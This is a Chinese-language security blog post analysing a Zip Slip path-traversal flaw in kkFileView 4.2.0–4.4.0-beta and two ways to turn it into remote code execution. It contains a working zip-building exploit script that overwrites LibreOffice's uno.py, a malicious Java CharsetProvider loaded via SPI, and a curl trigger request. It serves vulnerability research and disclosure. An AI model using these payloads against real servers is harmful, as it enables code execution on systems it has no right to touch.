title: kkFileView v4.2.0~v4.4.0-beta RCE 漏洞分析
author: Bmth
tags: []
cover: 'https://img-blog.csdnimg.cn/direct/98e1a150bf104dccb234d355ed8e39aa.png'
categories:
  - 代码审计
top_img: 'https://img-blog.csdnimg.cn/direct/98e1a150bf104dccb234d355ed8e39aa.png'
date: 2024-04-19 18:32:00
---
![](https://img-blog.csdnimg.cn/direct/98e1a150bf104dccb234d355ed8e39aa.png)

黄金榜上，偶失龙头望。明代暂遗贤，如何向。未遂风云便，争不恣狂荡。何须论得丧？才子词人，自是白衣卿相。
烟花巷陌，依约丹青屏障。幸有意中人，堪寻访。且恁偎红倚翠，风流事、平生畅。青春都一饷。忍把浮名，换了浅斟低唱！ 

Zip Slip漏洞还是很经典的，但没咋接触过，记录一下，[Java Zip Slip漏洞案例分析及实战挖掘](https://xz.aliyun.com/t/12081)

## 环境搭建
```bash
wget https://kkview.cn/resource/kkFileView-4.3.0-docker.tar
docker load -i kkFileView-4.3.0-docker.tar
docker run -it -p 8012:8012 keking/kkfileview:4.3.0
```

后续可以把jar拉出来，然后动调
```bash
java -Dfile.encoding=UTF-8 -Dspring.config.location=../config/application.properties -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -jar kkFileView-4.3.0.jar
```

## 漏洞分析
看到预览文件功能
`cn.keking.web.controller.OnlinePreviewController`
![](https://img-blog.csdnimg.cn/direct/4ab1af26d6e34b4a9d384a0e655d260e.png)

根据文件类型获取对应的service，这里看到我们上传zip文件，那么 filePreview 即`CompressFilePreviewImpl`，最后会调用 filePreview 的 filePreviewHandle 方法进行处理

`cn.keking.service.impl.CompressFilePreviewImpl#filePreviewHandle`
![](https://img-blog.csdnimg.cn/direct/ce6b2c0d12df445db943a5e61878a6ed.png)

进行解压操作
`cn.keking.service.CompressFileReader#unRar`
![](https://img-blog.csdnimg.cn/direct/8352d20f14664b758dbc18a5757a1d3c.png)

获取到压缩包内部文件名，直接对路径进行拼接，导致目录穿越，并调用 FileOutputStream 创建文件，注意append为true，即如果文件已存在则追加数据

并且目录不存在的话，会 mkdirs 创建多级目录

**注意：**
这里 FileOutputStream 写文件需要先存在`extractPath + folderName + "_" + File.separator`这个文件夹，否则会报错找不到文件

所以需要放一个正常文件来构造该目录

## 漏洞利用
其实就一个Zip Slip，内容不足以我写一篇博客记录，当然是有后续了，先看看公开的方法

### uno.py RCE
目标在使用odt转pdf时会调用系统的Libreoffice，而此进程会调用库中的uno.py文件，因此可以在该文件内添加恶意代码
```python
import zipfile

if __name__ == "__main__":
    try:
        binary1 = b'1ue'
        binary2 = b'import os\r\nos.system(\'touch /tmp/hack_by_1ue\')'
        zipFile = zipfile.ZipFile("hack.zip", "a", zipfile.ZIP_DEFLATED)
        info = zipfile.ZipInfo("hack.zip")
        zipFile.writestr("test", binary1)
        zipFile.writestr("../../../../../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py", binary2)
        zipFile.close()
    except IOError as e:
        raise e
```
![](https://img-blog.csdnimg.cn/direct/c98ab067a4a74799b2d9a072657fe409.png)

缺陷：需要存在Libreoffice，并知道安装路径

### SpringBoot 任意文件写RCE
三梦师傅yyds！

看到该漏洞，第一时间就想的是SpringBoot写文件RCE，LandGrey师傅的charsets.jar需要替换该文件，那么就想到threedr3am师傅的SPI机制

看到`Charset.forName`的源码
```java
public static Charset forName(String charsetName) {
    Charset cs = lookup(charsetName);
    if (cs != null)
        return cs;
    throw new UnsupportedCharsetException(charsetName);
}
private static Charset lookup(String charsetName) {
    if (charsetName == null)
        throw new IllegalArgumentException("Null charset name");
    Object[] a;
    if ((a = cache1) != null && charsetName.equals(a[0]))
        return (Charset)a[1];
    // We expect most programs to use one Charset repeatedly.
    // We convey a hint to this effect to the VM by putting the
    // level 1 cache miss code in a separate method.
    return lookup2(charsetName);
}

private static Charset lookup2(String charsetName) {
    Object[] a;
    if ((a = cache2) != null && charsetName.equals(a[0])) {
        cache2 = cache1;
        cache1 = a;
        return (Charset)a[1];
    }
    Charset cs;
    if ((cs = standardProvider.charsetForName(charsetName)) != null ||
        (cs = lookupExtendedCharset(charsetName))           != null ||
        (cs = lookupViaProviders(charsetName))              != null)
    {
        cache(charsetName, cs);
        return cs;
    }

    /* Only need to check the name if we didn't find a charset for it */
    checkName(charsetName);
    return null;
}
```
跟进 lookupViaProviders 的 providers 方法
![](https://img-blog.csdnimg.cn/direct/573392b073f746f3b8c8319827910159.png)

发现就是一个SPI加载provider的模式
那么我们可以编写一个继承了`java.nio.charset.spi.CharsetProvider`类的恶意provider，通过SPI机制，触发其加载并初始化

Evil.java：
```java
import java.io.IOException;
import java.nio.charset.Charset;
import java.util.HashSet;
import java.util.Iterator;

public class Evil extends java.nio.charset.spi.CharsetProvider {

    @Override
    public Iterator<Charset> charsets() {
        return new HashSet<Charset>().iterator();
    }

    @Override
    public Charset charsetForName(String charsetName) {
        if (charsetName.startsWith("Evil")) {
            try {
                Runtime.getRuntime().exec("touch /tmp/test111");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return Charset.forName("UTF-8");
    }
}
```

在jre/classes内创建文件夹META-INF/services，在创建的文件夹下面创建一个文件，命名为SPI接口的全路径名，内容为需要动态加载的实现类的全路径名
```
bmth@bmth:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes$ tree
.
├── Evil.class
└── META-INF
    └── services
        └── java.nio.charset.spi.CharsetProvider

bmth@bmth:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes$ cat META-INF/services/java.nio.charset.spi.CharsetProvider
Evil
```
最后创建压缩包并上传预览
![](https://img-blog.csdnimg.cn/direct/1495841265704f95bf11380593304fd4.png)

成功写入文件

最后看看如何触发：`org.springframework.web.accept.HeaderContentNegotiationStrategy`
![](https://img-blog.csdnimg.cn/direct/ea0e33d7987f4babb715cedbec262035.png)

获取 Header头 Accept 的值，跟进处理方法`MediaType.parseMediaTypes(headerValues)`
```
<init>:189, MimeType (org.springframework.util)
parseMimeTypeInternal:255, MimeTypeUtils (org.springframework.util)
parseMimeType:195, MimeTypeUtils (org.springframework.util)
parseMediaType:617, MediaType (org.springframework.http)
parseMediaTypes:646, MediaType (org.springframework.http)
parseMediaTypes:666, MediaType (org.springframework.http)
resolveMediaTypes:53, HeaderContentNegotiationStrategy (org.springframework.web.accept)
```
new实例化对象MimeType
![](https://img-blog.csdnimg.cn/direct/441cf35b77184c13a406b9b6e64e118d.png)

调用 checkParameters 方法检测传入的值

![](https://img-blog.csdnimg.cn/direct/258d6fcf47404274b47481b08b03e859.png)

触发到Charset.forName()

最后的exp：（需要docker restart重启服务）
```
curl -X GET "http://192.168.111.178:8012/" -H "Accept: text/html;charset=Evil"
```

缺陷：
1. 由于类加载器缓存的机制，需要重启后才能加载到，非常鸡肋。。。
2. 需要知道jdk的绝对路径

## 总结
.jar包的任意文件写实现RCE还是非常困难的，需要一些第三方依赖，后续期待大佬们的研究

太菜了，没有想到更好的方法qwq，当然，如果非jar包启动直接freemarker模板注入即可

五一去粥的嘉年华和音律联觉了，打工仔难得的假期！

参考：
[从Spring Boot FatJar文件写漏洞的一次实践](https://www.cnblogs.com/wh4am1/p/14681335.html)
[JDK8任意文件写场景下的SpringBoot RCE](https://threedr3am.github.io/2021/04/14/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84SpringBoot%20RCE/)
[https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC](https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC)